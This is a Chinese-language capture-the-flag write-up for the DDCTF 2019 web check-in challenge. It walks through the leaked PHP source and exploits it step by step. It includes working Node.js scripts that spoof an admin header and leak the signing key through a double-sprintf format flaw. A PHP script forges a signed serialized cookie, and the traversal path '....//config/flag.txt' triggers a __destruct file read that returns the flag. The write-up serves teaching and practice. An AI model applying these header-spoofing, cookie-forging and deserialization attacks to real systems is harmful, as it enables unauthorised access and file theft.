## 0x02. Web 2 - Web 签到题
### 题目
> WEB 签到题  
> 
> http://117.51.158.44/index.php

### 解题过程
打开题目入口后，页面显示 *抱歉，您没有登陆权限，请获取权限后访问-----*。~~（录字打错了兄弟~~

首页的 HTTP 包数据：

```http
GET /index.php HTTP/1.1
Host: 117.51.158.44
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
DNT: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

HTTP/1.1 200 OK
Server: nginx/1.10.3 (Ubuntu)
Date: Fri, 19 Apr 2019 07:52:14 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
Content-Encoding: gzip

<html>
<head>
    <head lang="en">
        <meta charset="UTF-8">
        <title>DiDiCTF</title>
        <link rel="stylesheet" href="highlight/styles/default.css">
        <script src="highlight/highlight.pack.js"></script>

    <style>
        body{TEXT-ALIGN: center;}
        center{ MARGIN-RIGHT: auto;
            MARGIN-LEFT: auto;
            height:200px;
            background: #fdfffb;
            width:600px;
            vertical-align:middle;
            line-height:500px;
        }
    </style>

    <script type="text/javascript" src="js/jquery.min.js"></script>
    <script type="text/javascript" src="js/index.js"></script>
    <script>hljs.initHighlightingOnLoad();</script>
    <body onload="auth()">
        <div class='center' id="auth">
        </div>


    </body>
</head>
</html>
```

没发现什么有用的信息，那么继续往下查看 `js/index.js`：

```javascript
/**
 * Created by PhpStorm.
 * User: didi
 * Date: 2019/1/13
 * Time: 9:05 PM
 */

function auth() {
    $.ajax({
        type: "post",
        url:"http://117.51.158.44/app/Auth.php",
        contentType: "application/json;charset=utf-8",
        dataType: "json",
        beforeSend: function (XMLHttpRequest) {
            XMLHttpRequest.setRequestHeader("didictf_username", "");
        },
        success: function (getdata) {
           console.log(getdata);
           if(getdata.data !== '') {
               document.getElementById('auth').innerHTML = getdata.data;
           }
        },error:function(error){
            console.log(error);
        }
    });
}
```

在请求头中塞入 username 明显是个诡异的操作。

打开浏览器控制台，重新定义 `auth` 方法（顺便格式化一下代码）：
```diff
- function auth () {
+ function auth (username) {
...
-      XMLHttpRequest.setRequestHeader('didictf_username', '')
+      XMLHttpRequest.setRequestHeader('didictf_username', username)
...
```

```javascript
 function auth (username) {
  $.ajax({
    type: 'post',
    url: 'http://117.51.158.44/app/Auth.php',
    contentType: 'application/json;charset=utf-8',
    dataType: 'json',
    beforeSend (XMLHttpRequest) {
      XMLHttpRequest.setRequestHeader('didictf_username', username)
    },
    success (getdata) {
      console.log(getdata)
      if (getdata.data !== '') {
        document.getElementById('auth').innerHTML = getdata.data
      }
    },
    error (error){
      console.log(error)
    },
  })
}
// <- undefined
```

~~舒服多了，~~ 然后试下 `admin`：

```javascript
auth('admin')
// <- undefined
// {errMsg: "success", data: "您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php"}
// XHR finished loading: POST "http://117.51.158.44/app/Auth.php".
```

一发入魂。（不愧是我.gif

紧接着跟着提示来到 [`app/fL2XID2i0Cdh.php`](./clues/fL2XID2i0Cdh.php)，获得两份文件的源代码。

[Application.php](./clues/app/Application.php)：

```php
<?php
/**
 * url:app/Application.php
 */

Class Application {
    var $path = '';


    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }

    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    private function sanitizepath($path) {
    $path = trim($path);
    $path=str_replace('../','',$path);
    $path=str_replace('..\\','',$path);
    return $path;
}

public function __destruct() {
    if(empty($this->path)) {
        exit();
    }else{
        $path = $this->sanitizepath($this->path);
        if(strlen($path) !== 18) {
            exit();
        }
        $this->response($data=file_get_contents($path),'Congratulations');
    }
    exit();
}
}

?>
```


[Session.php](./clues/app/Session.php)：

```php
<?php
/**
 * url:app/Session.php
 */

include 'Application.php';
class Session extends Application {

    //key建议为8位字符串
    var $eancrykey                  = '';
    var $cookie_expiration			= 7200;
    var $cookie_name                = 'ddctf_id';
    var $cookie_path				= '';
    var $cookie_domain				= '';
    var $cookie_secure				= FALSE;
    var $activity                   = "DiDiCTF";


    public function index()
    {
	if(parent::auth()) {
            $this->get_key();
            if($this->session_read()) {
                $data = 'DiDI Welcome you %s';
                $data = sprintf($data,$_SERVER['HTTP_USER_AGENT']);
                parent::response($data,'sucess');
            }else{
                $this->session_create();
                $data = 'DiDI Welcome you';
                parent::response($data,'sucess');
            }
        }

    }

    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }

    public function session_read() {
        if(empty($_COOKIE)) {
        return FALSE;
        }

        $session = $_COOKIE[$this->cookie_name];
        if(!isset($session)) {
            parent::response("session not found",'error');
            return FALSE;
        }
        $hash = substr($session,strlen($session)-32);
        $session = substr($session,0,strlen($session)-32);

        if($hash !== md5($this->eancrykey.$session)) {
            parent::response("the cookie data not match",'error');
            return FALSE;
        }
        $session = unserialize($session);


        if(!is_array($session) OR !isset($session['session_id']) OR !isset($session['ip_address']) OR !isset($session['user_agent'])){
            return FALSE;
        }

        if(!empty($_POST["nickname"])) {
            $arr = array($_POST["nickname"],$this->eancrykey);
            $data = "Welcome my friend %s";
            foreach ($arr as $k => $v) {
                $data = sprintf($data,$v);
            }
            parent::response($data,"Welcome");
        }

        if($session['ip_address'] != $_SERVER['REMOTE_ADDR']) {
            parent::response('the ip addree not match'.'error');
            return FALSE;
        }
        if($session['user_agent'] != $_SERVER['HTTP_USER_AGENT']) {
            parent::response('the user agent not match','error');
            return FALSE;
        }
        return TRUE;

    }

    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
}


$ddctf = new Session();
$ddctf->index();

?>
```

分解 Review 一下：

1. Application 作为父类，提供身份验证方法 (`auth`)；但该方法 **信任请求体数据**，所以在前面就已经被轻松攻破了。

    ```php
    public function auth() {
        $DIDICTF_ADMIN = 'admin';
        if(!empty($_SERVER['HTTP_DIDICTF_USERNAME']) && $_SERVER['HTTP_DIDICTF_USERNAME'] == $DIDICTF_ADMIN) {
            $this->response('您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php');
            return TRUE;
        }else{
            $this->response('抱歉，您没有登陆权限，请获取权限后访问-----','error');
            exit();
        }

    }
    ```
    (Application.php:L19-L27)

2. Application 作为父类，提供打印信息至响应体的方法 (`response`)；该方法可以被重复调用，所以可能会输出多段连续的 JSON 字符串。

    ```php
    public function response($data, $errMsg = 'success') {
        $ret = ['errMsg' => $errMsg,
            'data' => $data];
        $ret = json_encode($ret);
        header('Content-type: application/json');
        echo $ret;

    }
    ```
    (Application.php:L10-L17)

3. Application 作为父类，定义了 **解构方法**；在解构过程中 **可以输出指定路径的文件内容**，但条件是路经值长度为 18，且该路径值会先经历一次 sanitize；路经值取 `$this->path`，但代码中并没有出现更改值的接口。

    ```php
    public function __destruct() {
        if(empty($this->path)) {
            exit();
        }else{
            $path = $this->sanitizepath($this->path);
            if(strlen($path) !== 18) {
                exit();
            }
            $this->response($data=file_get_contents($path),'Congratulations');
        }
        exit();
    }
    ```
    (Application.php:L37-L48)

4. 对路径做 sanitize 的函数会先去除了值头尾的空格，然后依次过滤 **一次** `'../'` 和 `'..\\'`。

    ```php
    private function sanitizepath($path) {
        $path = trim($path);
        $path=str_replace('../','',$path);
        $path=str_replace('..\\','',$path);
        return $path;
    }
    ```
    (Application.php:L30-L35)

5. Session 继承于 Application。

    ```php
    class Session extends Application {
    ```
    (Session.php:L7)

6. Session 提供了一个加载 key 的方法 (`get_key`)；执行后会将 `key.txt` 文件的内容写入变量 `$this->eancrykey`。~~（encrypt 也拼错了兄弟~~

    ```php
    private function get_key() {
        //eancrykey  and flag under the folder
        $this->eancrykey =  file_get_contents('../config/key.txt');
    }
    ```
    (Session.php:L36-L39)

7. 仅在 `auth` 成功时会触发执行 `get_key`。

    ```php
    if(parent::auth()) {
              $this->get_key();
    ```
    (Session.php:L21-L22)

8. 在 `get_key` 方法的注释中写道：

    ```php
    //eancrykey  and flag under the folder
    ```
    (Session.php:L37)

    疯狂暗示目标文件为 `../config/flag.txt`。

9.  Session 提供了读写 session 的方法 `session_read` 和 `session_create`。
10. `session_create` 的代码解释了 cookie 中 ddctf_id (即 session) 字段的结构：
  
    ```php
    private function session_create() {
        $sessionid = '';
        while(strlen($sessionid) < 32) {
            $sessionid .= mt_rand(0,mt_getrandmax());
        }

        $userdata = array(
            'session_id' => md5(uniqid($sessionid,TRUE)),
            'ip_address' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'user_data' => '',
        );

        $cookiedata = serialize($userdata);
        $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);
        $expire = $this->cookie_expiration + time();
        setcookie(
            $this->cookie_name,
            $cookiedata,
            $expire,
            $this->cookie_path,
            $this->cookie_domain,
            $this->cookie_secure
            );

    }
    ```
    (Session.php:L86-L111)

    其中：
    ```php
    $cookiedata = serialize($userdata);
    $cookiedata = $cookiedata.md5($this->eancrykey.$cookiedata);`
    ```

    换个容易理解的写法即：
    ```php
    // 通过序列化 $userdata 生成 $payload
    $payload = serialize($userdata);
    // 使用 $key 对 $payload 做签名，防止客户端随意篡改 session
    $session = $payload.md5($key.$payload);
    ```


11. 由于构建 session 值时需要序列化 `$userdata`，所以在读取操作 `session_read` 中也就需要 **反序列化** `$payload`。

    ```php
    $session = unserialize($session);
    ```
    (Session.php:L58)

12. `session_read` 中出现了一个诡异的操作，可以通过 POST nickname 字段触发；在这个操作中还出现了 **对同一值重复 `sprintf`**：

    ```php
    if(!empty($_POST["nickname"])) {
        $arr = array($_POST["nickname"],$this->eancrykey);
        $data = "Welcome my friend %s";
        foreach ($arr as $k => $v) {
            $data = sprintf($data,$v);
        }
        parent::response($data,"Welcome");
    }
    ```
    (Session.php:L65-L72)


那么，首先利用 #12 出现的漏洞，向 `/app/Session.php` 发送 POST 请求，并使得 `$_POST["nickname"] == "%s"`；同时根据 #6 和 #7，沿用前面攻破 `auth` 的方法，保证 `get_key` 会被执行：

```javascript
const got = require('got')
const { CookieJar } = require('tough-cookie')

const createClient = () => {
  const jar = new CookieJar()
  return got.extend({
    headers: {
      didictf_username: 'admin',
    },
    cookieJar: jar,
  })
}

const FormData = require('form-data')

;(async () => {
  const client = createClient()
  const url = 'http://117.51.158.44/app/Session.php'

  // create session
  await client.post(url)

  // get the key
  let form = new FormData()
  form.append('nickname', '%s')

  let response = await client.post(url, {
    body: form,
  })
  console.log(response.body)

})()
```

观察 Node.js 打印的日志：

```json
{"errMsg":"success","data":"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"}{"errMsg":"Welcome","data":"Welcome my friend EzblrbNS"}{"errMsg":"sucess","data":"DiDI Welcome you got\/9.6.0 (https:\/\/github.com\/sindresorhus\/got)"}
```

在第二条 JSON 中便获得了 key 的值：`EzblrbNS`。

这是因为 #12 中问题语句的执行过程变成了：

```php
// （伪代码）
$data = "Welcome my friend %s";
// <- "Welcome my friend %s"
$data = sprintf($data, $_POST["nickname"]);
// -> sprintf("Welcome my friend %s", "%s")
// <- "Welcome my friend %s"
$data = sprintf($data, $this->eancrykey);
// -> sprintf("Welcome my friend %s", "EzblrbNS")
// <- "Welcome my friend EzblrbNS"
```

获得了 key，意味着可以构造任意内容的 session（根据 #9 的规则）。

接下来利用 [#11 的反序列化触发 #3 的解构方法执行](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14)，并借此为 `$this->path` 赋值。

这里快速地写一个 PHP，帮助生成序列化的 session:

```php
<?php
  $key = 'EzblrbNS';

  class Application {
    var $path = "TODO";
  }
  $instance = new Application();
  $payload = serialize($instance);
  $session = $payload.md5($key.$payload);
  echo $session;
?>
```

那么 `path` 应该是什么呢？

根据 #8 的注释，暂猜测目标文件是 `../config/flag.txt`，长度刚好就是 18，但还需要先通过 sanitize。

回到 #4，可以发现 sanitize 函数对 `'../'` 的过滤操作仅仅只做了一次。于是构造出字符串 `....//config/flag.txt`，使 sanitize 后的值恰好为 `../config/flag.txt`。

修改刚才的 PHP 脚本：
```diff
-    var $path = "TODO";
+    var $path = "....//config/flag.txt";
```

[执行](https://eval.in/private/3e61187556e78f) 后获得序列化的 session：`O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525`，写入 cookie 后再次向 Session.php 发起请求：

```javascript
const got = require('got')
const { CookieJar } = require('tough-cookie')

const createClient = () => {
  const jar = new CookieJar()
  return got.extend({
    headers: {
      didictf_username: 'admin',
    },
    cookieJar: jar,
  })
}

;(async () => {
  const SESSION = 'O:11:"Application":1:{s:4:"path";s:21:"....//config/flag.txt";}77cd55a8d29df4f005f85e536d876525'
  const client = createClient()
  const response = await client.post('http://117.51.158.44/app/Session.php', {
    headers: {
      cookie: `ddctf_id=${encodeURIComponent(SESSION)};`,
    },
  })
  console.log(response.body)
})()
```

观察 Node.js 打印的日志：

```json
{"errMsg":"success","data":"\u60a8\u5f53\u524d\u5f53\u524d\u6743\u9650\u4e3a\u7ba1\u7406\u5458----\u8bf7\u8bbf\u95ee:app\/fL2XID2i0Cdh.php"}{"errMsg":"Congratulations","data":"DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}"}
```

获得 flag `DDCTF{ddctf2019_G4uqwj6E_pHVlHIDDGdV8qA2j}`，顺利拿下第二关 :v:。

### 涉及资料
- 源代码
  - [获取 key](./step2.js)
  - [生成序列化 session](./serialize.php)
  - [获取 flag](./step2.js)
  - [完整通关脚本](./step2.js)
- 知识点
  - [PHP 反序列化触发命令执行](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#_14)
  - ~~[登入界面中，「登录」和「登陆」哪个正确？](https://www.zhihu.com/question/19570377)~~
  - ~~[encrypt 是什么意思](http://dict.cn/encrypt)~~
